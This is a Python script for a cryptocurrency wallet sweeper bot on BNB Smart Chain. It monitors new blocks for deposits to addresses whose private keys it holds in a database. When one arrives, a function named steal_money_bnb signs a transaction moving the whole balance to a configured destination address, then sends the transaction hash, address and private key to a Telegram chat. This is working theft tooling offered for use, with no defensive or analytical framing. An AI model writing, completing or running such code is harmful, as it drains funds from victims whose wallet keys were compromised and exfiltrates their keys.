import database as db
from web3 import Web3
from web3.middleware import geth_poa_middleware
import time
from config import send_address, bnb_grab, bnb_vhod, YOUR_CHAT_ID, TELEGRAM_BOT_TOKEN
import telegram
from telegram import Bot

bot = Bot(token=TELEGRAM_BOT_TOKEN)

web3 = Web3(Web3.HTTPProvider(bnb_vhod))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

def start_vivod():
    """main function"""
    getblocks_bnb()

def getblocks_bnb():
    """get blocks"""
    last_block = 0
    while True:
        latestBlock = web3.eth.get_block(block_identifier=web3.eth.defaultBlock, full_transactions=True)
        if last_block == latestBlock.number:
            continue
        last_block = latestBlock.number
        trans_bnb = latestBlock.transactions
        print(f'Last Block! {str(latestBlock.number)} | BNB')
        trans_wallets_bnb(trans_bnb)
        time.sleep(0.5)

def trans_wallets_bnb(trans_bnb):
    """extract"""
    for x in trans_bnb:
        try:
            to_address_split = x['to']
            to_address = to_address_split.split('\n')
            for address in to_address:
                res = db.search_vivod(address)
                if res == False:
                    pass
                else:
                    steal_money_bnb(address)
        except:
            pass

def steal_money_bnb(address):
    """withdraw"""
    try:
        balance = web3.eth.get_balance(address)
        gwei = web3.eth.gas_price + 2000000000


        wallet_key = db.get_info_address(address)
        grab_from_bnb_balance = web3.toWei(bnb_grab, 'ether')

        counter = 0
        while True:
            if balance < grab_from_bnb_balance:
                return
            else:
                break
        nonce = web3.eth.get_transaction_count(address)
        gas = int(gwei) * 21000
        amount = balance - web3.toWei(0.00001, 'ether') - gas
        tx_price = {
            'chainId': 56,
            'nonce': nonce,
            'to': send_address,
            'value': amount,
            'gas': 21000,
            'gasPrice': int(gwei)
        }
        signed_tx = web3.eth.account.sign_transaction(tx_price, wallet_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        hash_xd = web3.toHex(tx_hash)
        amount_ether = web3.fromWei(amount, "ether")
        success_message = f' ✅  SUCCESSFUL WITHDRAWAL BNB  ✅ \n \n HASH: {hash_xd}   \n \n 💰 AMOUNT: {amount_ether} 💰  \n \n ADDRESS: {address}  \n \n PRIVATE: {wallet_key}'
        print(success_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=success_message)
    except Exception as e:
        error_message = f'BNB | UNSUCCESSFUL WITHDRAWAL | ADDRESS: {address} | MISTAKE: {e}'
        print(error_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=error_message)

if __name__ == "__main__":
    start_vivod()
